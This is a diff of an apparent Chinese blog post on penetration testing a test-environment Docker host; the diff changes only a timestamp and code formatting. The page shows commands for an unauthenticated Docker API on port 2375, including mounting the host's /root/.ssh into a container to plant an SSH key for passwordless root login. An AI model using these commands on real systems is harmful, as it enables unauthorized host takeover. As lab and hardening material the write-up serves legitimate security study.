@@ -24,7 +24,7 @@
 <meta property="og:image" content="http://172.30.61.219:4000/images/%E5%9B%BE%E7%89%876.png">
 <meta property="og:image" content="http://172.30.61.219:4000/images/%E5%9B%BE%E7%89%877.png">
 <meta property="og:image" content="http://172.30.61.219:4000/images/%E5%9B%BE%E7%89%878.png">
-<meta property="og:updated_time" content="2019-09-11T08:39:54.000Z">
+<meta property="og:updated_time" content="2019-09-12T02:12:30.000Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Docker渗透">
 <meta name="twitter:description" content="对测试环境docker进行简单的渗透测试">
@@ -199,7 +199,7 @@
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker -H 172.30.21.240:2375 image</span><br><span class="line">docker -H 172.30.21.240:2375 ps -a</span><br></pre></td></tr></table></figure>
 
 <h3 id="第二步"><a href="#第二步" class="headerlink" title="第二步"></a><strong>第二步</strong></h3><p>我们的重头戏，对目标进行渗透</p>
-<p>主要思路是通过操纵docker命令将宿主机上root/.ssh目录挂载到指定容器中的/mnt目录，然后将自己的公钥复制到容器中，便可以无密码登陆到宿主机，OK，我们进行操作</p>
+<p>主要思路是通过操纵docker命令将宿主机上<code>root/.ssh</code>目录挂载到指定容器中的<code>/mnt</code>目录，然后将自己的公钥复制到容器中，便可以无密码登陆到宿主机，OK，我们进行操作</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker -H 172.30.21.240:2375 run -it -v /root/.ssh:/mnt centos /bin/bash</span><br></pre></td></tr></table></figure>
 
 <p>等待下载完成即可</p>
